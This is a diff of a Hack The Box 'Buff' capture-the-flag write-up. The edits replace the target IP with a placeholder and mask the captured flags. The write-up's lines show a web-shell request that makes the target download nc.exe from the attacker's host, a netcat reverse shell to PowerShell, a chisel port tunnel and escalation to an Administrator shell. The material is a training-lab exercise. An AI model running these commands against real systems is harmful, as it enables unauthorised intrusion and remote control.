@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Buff
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-buff-infocard.png)
-
 Short description to include any strange things to be dealt with 
 
 TODO: finish writeup, clean up. - I wish I had taken better notes on this one, but I finished it during a pretty busy time.
@@ -43,14 +41,14 @@ Then, on the victim machine you need to create a client, specifying which local 
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.198`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
 ```text
-zweilos@kali:~/htb/buff$ nmap -p- -sC -sV --reason -oN buff.nmap -Pn 10.10.10.198
+zweilos@kali:~/htb/buff$ nmap -p- -sC -sV --reason -oN buff.nmap -Pn <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 10:13 EDT
-Nmap scan report for 10.10.10.198
+Nmap scan report for <YOUR_IP>
 Host is up, received user-set (0.10s latency).
 Not shown: 65533 filtered ports
 Reason: 65533 no-responses
@@ -128,7 +126,7 @@ The exploit instructions looked more complicated than they actually were.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/buff]
-└─$ python3 ./buff-exploit.py 'http://10.10.10.198:8080/'                                           1 ⨯
+└─$ python3 ./buff-exploit.py 'http://<YOUR_IP>:8080/'                                           1 ⨯
             /\
 /vvvvvvvvvvvv \--------------------------------------,                                                  
 `^^^^^^^^^^^^ /============BOKU====================="
@@ -146,7 +144,7 @@ You can use **`curl`**, **`burp`**, or your web browser to do this.  From what I
 {% endhint %}
 
 ```text
-10.10.10.198:8080//upload/kamehameha.php?telepathy=DIR
+<YOUR_IP>:8080//upload/kamehameha.php?telepathy=DIR
 
 PNG  Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of C:\xampp\htdocs\gym\upload 22/08/2020 17:19
 . 22/08/2020 17:19
@@ -165,7 +163,7 @@ I am pretty sure another player uploaded plink there at some point, though at th
 
 ```text
 GET /upload/kamehameha.php?telepathy=curl.exe+"http%3a//10.10.15.82%3a8090/nc.exe"+-o+nc.exe HTTP/1.1
-Host: 10.10.10.198:8080
+Host: <YOUR_IP>:8080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -181,12 +179,12 @@ This time I used Burp to send the command to download `nc.exe` to the remote mac
 ## Initial Foothold
 
 ```text
-http://10.10.10.198:8080//upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.15.82%2012346
+http://<YOUR_IP>:8080//upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.15.82%2012346
 
 ┌──(zweilos㉿kali)-[~/htb/buff]
 └─$ nc -lvnp 12346                                                                                  1 ⨯
 listening on [any] 12346 ...
-connect to [10.10.15.82] from (UNKNOWN) [10.10.10.198] 51161
+connect to [10.10.15.82] from (UNKNOWN) [<YOUR_IP>] 51161
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -206,7 +204,6 @@ User Name  SID
 ========== ==============================================
 buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001
 
-
 GROUP INFORMATION
 -----------------
 
@@ -223,7 +220,6 @@ LOCAL                                  Well-known group S-1-2-0      Mandatory g
 NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -236,7 +232,6 @@ SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
 SeTimeZonePrivilege           Change the time zone                 Disabled
 
 ERROR: Unable to get user claims information.
-
 
 ```
 
@@ -290,7 +285,7 @@ Network Card(s):           1 NIC(s) Installed.
                                  Connection Name: Ethernet0
                                  DHCP Enabled:    No
                                  IP address(es)
-                                 [01]: 10.10.10.198
+                                 [01]: <YOUR_IP>
                                  [02]: fe80::68fa:10a9:abda:25fd
                                  [03]: dead:beef::d9f1:b233:54f6:380f
                                  [04]: dead:beef::68fa:10a9:abda:25fd
@@ -305,9 +300,7 @@ cd Documents
 PS C:\Users\shaun\Documents> ls
 ls
 
-
     Directory: C:\Users\shaun\Documents
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -325,18 +318,15 @@ START C:/xampp/xampp_start.exe
 PS C:\Users\shaun\desktop> ls
 ls
 
-
     Directory: C:\Users\shaun\desktop
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
 -ar---       22/08/2020     16:43             34 user.txt                                                              
 
-
 PS C:\Users\shaun\desktop> cat user.txt
 cat user.txt
-c414e3e8aff37e36d3e0ef36a3c8cdc3
+****
 ```
 
 Got the user flag from `shaun`'s desktop!
@@ -353,9 +343,7 @@ Beware...here there be rabbits.  Click [here](buff-write-up.md#cloudme_-1112-exe
 PS C:\xampp> ls
 ls
 
-
     Directory: C:\xampp
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -544,9 +532,7 @@ I used `mysqldump.exe` to dump the contents of the database, but there wasn't an
 PS C:\xampp\mysql> ls
 ls
 
-
     Directory: C:\xampp\mysql
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -626,9 +612,7 @@ End rabbit hole of doom...🐇🐇
 PS C:\Users\shaun\Downloads> ls
 ls
 
-
     Directory: C:\Users\shaun\Downloads
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -730,7 +714,7 @@ PS C:\Users\shaun\Downloads> ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:
 2020/08/23 23:43:13 client: Connected (Latency 53.5461ms)
 ```
 
-http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe -e powershell.exe 10.10.14.220 12346
+http://<YOUR_IP>:8080/upload/kamehameha.php?telepathy=nc.exe -e powershell.exe 10.10.14.220 12346
 
 Had to manually upload both nc.exe and chisel.exe...used burp repeater
 
@@ -751,7 +735,7 @@ R:8000:127.0.0.1:7890
 ┌──(zweilos㉿kali)-[~]
 └─$ nc -lvnp 12345                                                                                  1 ⨯
 listening on [any] 12345 ...
-connect to [10.10.18.82] from (UNKNOWN) [10.10.10.198] 49702
+connect to [10.10.18.82] from (UNKNOWN) [<YOUR_IP>] 49702
 Microsoft Windows [Version 10.0.17134.1610]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -767,7 +751,6 @@ USER INFORMATION
 User Name          SID                                          
 ================== =============================================
 buff\administrator S-1-5-21-2277156429-3381729605-2640630771-500
-
 
 GROUP INFORMATION
 -----------------
@@ -786,7 +769,6 @@ NT AUTHORITY\Local account                                    Well-known group S
 LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group             
 NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
 Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -828,13 +810,9 @@ and then I was logged in as Administrator, with full privileges!
 ```text
 c:\Users\Administrator\Desktop>type root.txt
 type root.txt
-b7f7dbc6de4b535a2e84e8c3362d081b
+****
 ```
 
 After getting an Administrator shell it was simple to collect my final proof.
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-buff-pwned.png)
-
-Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) for... \[something interesting or useful about this machine.\]
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
